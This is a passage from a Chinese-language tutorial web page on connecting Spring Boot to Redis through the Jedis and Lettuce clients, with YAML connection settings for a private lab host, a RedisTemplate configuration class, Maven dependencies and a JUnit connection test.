    <span class="token key atrule">host</span><span class="token punctuation">:</span> 172.16.163.128
    <span class="token key atrule">password</span><span class="token punctuation">:</span> dHcphufFGcSaJLMK
    <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">6380</span>
    <span class="token key atrule">timeout</span><span class="token punctuation">:</span> <span class="token number">10000</span>
    <span class="token key atrule">jedis</span><span class="token punctuation">:</span>
      <span class="token key atrule">pool</span><span class="token punctuation">:</span>
        <span class="token key atrule">min-idle</span><span class="token punctuation">:</span> <span class="token number">0</span>
        <span class="token key atrule">max-active</span><span class="token punctuation">:</span> <span class="token number">8</span>
        <span class="token key atrule">max-idle</span><span class="token punctuation">:</span> <span class="token number">8</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>RedisConfig配置</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>connection<span class="token punctuation">.</span></span><span class="token class-name">RedisConnectionFactory</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">RedisTemplate</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">GenericJackson2JsonRedisSerializer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">StringRedisSerializer</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Configuration</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RedisConfig</span> <span class="token punctuation">{</span>

    <span class="token annotation punctuation">@Bean</span>
    <span class="token keyword">public</span> <span class="token class-name">RedisTemplate</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> <span class="token function">redisTemplate</span><span class="token punctuation">(</span><span class="token class-name">RedisConnectionFactory</span> connectionFactory<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">RedisTemplate</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> template <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RedisTemplate</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        template<span class="token punctuation">.</span><span class="token function">setConnectionFactory</span><span class="token punctuation">(</span>connectionFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>
        template<span class="token punctuation">.</span><span class="token function">setKeySerializer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRedisSerializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        template<span class="token punctuation">.</span><span class="token function">setHashKeySerializer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRedisSerializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        template<span class="token punctuation">.</span><span class="token function">setValueSerializer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">GenericJackson2JsonRedisSerializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        template<span class="token punctuation">.</span><span class="token function">setHashValueSerializer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">GenericJackson2JsonRedisSerializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        template<span class="token punctuation">.</span><span class="token function">afterPropertiesSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> template<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注入JedisConnectionFactory：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230315153558460.png" alt="注入JedisConnectionFactory"></p>
</li>
<li></li>
<li>
<p>测试Redis连接</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.projectlombok<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>lombok<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${lombok.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>optional</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>optional</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${springboot.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${junit.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">Assert</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">Test</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>runner<span class="token punctuation">.</span></span><span class="token class-name">RunWith</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">SpringBootTest</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">RedisTemplate</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">ActiveProfiles</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">TestPropertySource</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span>junit4<span class="token punctuation">.</span></span><span class="token class-name">SpringRunner</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Resource</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@RunWith</span><span class="token punctuation">(</span><span class="token class-name">SpringRunner</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@SpringBootTest</span><span class="token punctuation">(</span>classes <span class="token operator">=</span> <span class="token class-name">DatabaseApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@ActiveProfiles</span><span class="token punctuation">(</span><span class="token string">"dev"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@TestPropertySource</span><span class="token punctuation">(</span>
        properties <span class="token operator">=</span> <span class="token punctuation">{</span>
                <span class="token string">"server.port=80"</span><span class="token punctuation">,</span>
                <span class="token string">"spring.application.name=configuration"</span><span class="token punctuation">,</span>
                <span class="token string">"spring.cloud.nacos.config.server-addr=native.virtual.com:8848"</span><span class="token punctuation">,</span>
                <span class="token string">"spring.cloud.nacos.config.file-extension=yml"</span><span class="token punctuation">,</span>
                <span class="token string">"spring.cloud.nacos.config.namespace=learn-dev"</span><span class="token punctuation">,</span>
                <span class="token string">"spring.cloud.nacos.config.group=DEFAULT_GROUP"</span><span class="token punctuation">,</span>
                <span class="token string">"spring.cloud.nacos.config.extension-configs[0].data-id=redis.yml"</span><span class="token punctuation">,</span>
                <span class="token string">"spring.cloud.nacos.config.extension-configs[0].refresh=true"</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DatabaseApplicationTests</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Resource</span>
    <span class="token keyword">private</span> <span class="token class-name">RedisTemplate</span> redisTemplate<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testRedisConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        redisTemplate<span class="token punctuation">.</span><span class="token function">opsForList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">leftPush</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        redisTemplate<span class="token punctuation">.</span><span class="token function">opsForList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">leftPush</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"222"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        redisTemplate<span class="token punctuation">.</span><span class="token function">opsForList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">leftPush</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"333"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Assert</span><span class="token punctuation">.</span><span class="token function">assertTrue</span><span class="token punctuation">(</span><span class="token string">"111"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>redisTemplate<span class="token punctuation">.</span><span class="token function">opsForList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rightPop</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Assert</span><span class="token punctuation">.</span><span class="token function">assertTrue</span><span class="token punctuation">(</span>redisTemplate<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h1>基于RedisTemplate+Lettuce的数据操作</h1>
<h2 id="Lettuce-说明">Lettuce 说明</h2>
<p><a href="https://github.com/lettuce-io/lettuce-core">Github（lettuce-core）</a></p>
<p>Lettuce 是一个可伸缩线程安全的 Redis 客户端。多个线程可以共享同一个 RedisConnection。它利用优秀 netty NIO 框架来高效地管理多个连接。</p>
<p>Lettuce 从一开始就按照非阻塞式 IO 进行设计，是一个纯异步客户端，对异步和反应式 API 的支持都很全面。即使是同步命令，底层的通信过程仍然是异步模型，只是通过阻塞调用线程来模拟出同步效果而已。</p>
<blockquote>
<p>在SpringBoot 2.x版本中Redis默认客户端是Lettuce，本文主要介绍SpringBoot 和默认的Lettuce的整合案例</p>
</blockquote>
<h2 id="Lettuce-特性">Lettuce 特性</h2>
<ul>
<li>支持 同步、异步、响应式 的方式</li>
<li>支持 Redis Sentinel</li>
<li>支持 Redis Cluster</li>
<li>支持 SSL 和 Unix Domain Socket 连接</li>
<li>支持 Streaming API</li>
<li>支持 CDI 和 Spring 的集成</li>
<li>支持 Command Interfaces</li>
<li>兼容 Java 8+ 以上版本</li>
</ul>
<p><a href="https://docs.spring.io/spring-data/redis/docs/current/reference/html/#redis:connectors:lettuce">Lettuce  和 Jedis 对比官方说明</a></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230315150902635.png" alt="image-20230315150902635"></p>
<h2 id="实现DEMO-2">实现DEMO</h2>
<ol>
<li>
<p>POM.xml</p>
<p>引入spring-boot-starter-data-redis包，SpringBoot2中默认的客户端是Lettuce, 所以需要exclude掉lettuce-core包，并引入jedis的包。</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.6.6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-cloud-starter-alibaba-nacos-config<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-data-redis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.6.6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.commons<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-pool2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.11.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>redis.yml 配置</p>
 <pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span> 
  <span class="token key atrule">redis</span><span class="token punctuation">:</span>
    <span class="token key atrule">database</span><span class="token punctuation">:</span> <span class="token number">0</span>
    <span class="token key atrule">host</span><span class="token punctuation">:</span> 172.16.163.128
    <span class="token key atrule">password</span><span class="token punctuation">:</span> dHcphufFGcSaJLMK
    <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">6380</span>
    <span class="token key atrule">timeout</span><span class="token punctuation">:</span> <span class="token number">10000</span>
    <span class="token key atrule">lettuce</span><span class="token punctuation">:</span>
      <span class="token key atrule">pool</span><span class="token punctuation">:</span>
        <span class="token key atrule">max-active</span><span class="token punctuation">:</span> <span class="token number">200</span>
        <span class="token key atrule">max-idle</span><span class="token punctuation">:</span> <span class="token number">5</span>
        <span class="token key atrule">max-wait</span><span class="token punctuation">:</span> <span class="token number">-1</span>
        <span class="token key atrule">min-idle</span><span class="token punctuation">:</span> <span class="token number">0</span>
        <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>RedisConfig配置（代码和Jedis注入一样 ，只是装配的 <code>connectionFactory</code>  实现类不一样 ）</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>connection<span class="token punctuation">.</span></span><span class="token class-name">RedisConnectionFactory</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">RedisTemplate</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">GenericJackson2JsonRedisSerializer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">StringRedisSerializer</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Configuration</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RedisConfig</span> <span class="token punctuation">{</span>

    <span class="token annotation punctuation">@Bean</span>
    <span class="token keyword">public</span> <span class="token class-name">RedisTemplate</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> <span class="token function">redisTemplate</span><span class="token punctuation">(</span><span class="token class-name">RedisConnectionFactory</span> connectionFactory<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">RedisTemplate</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> template <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RedisTemplate</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        template<span class="token punctuation">.</span><span class="token function">setConnectionFactory</span><span class="token punctuation">(</span>connectionFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>
        template<span class="token punctuation">.</span><span class="token function">setKeySerializer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRedisSerializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        template<span class="token punctuation">.</span><span class="token function">setHashKeySerializer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRedisSerializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        template<span class="token punctuation">.</span><span class="token function">setValueSerializer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">GenericJackson2JsonRedisSerializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        template<span class="token punctuation">.</span><span class="token function">setHashValueSerializer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">GenericJackson2JsonRedisSerializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        template<span class="token punctuation">.</span><span class="token function">afterPropertiesSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> template<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注入JedisConnectionFactory：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230315154313840.png" alt="注入LettuceConnectionFactory"></p>
</li>
<li>
<p>测试Redis连接</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.projectlombok<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>lombok<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${lombok.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>optional</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>optional</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
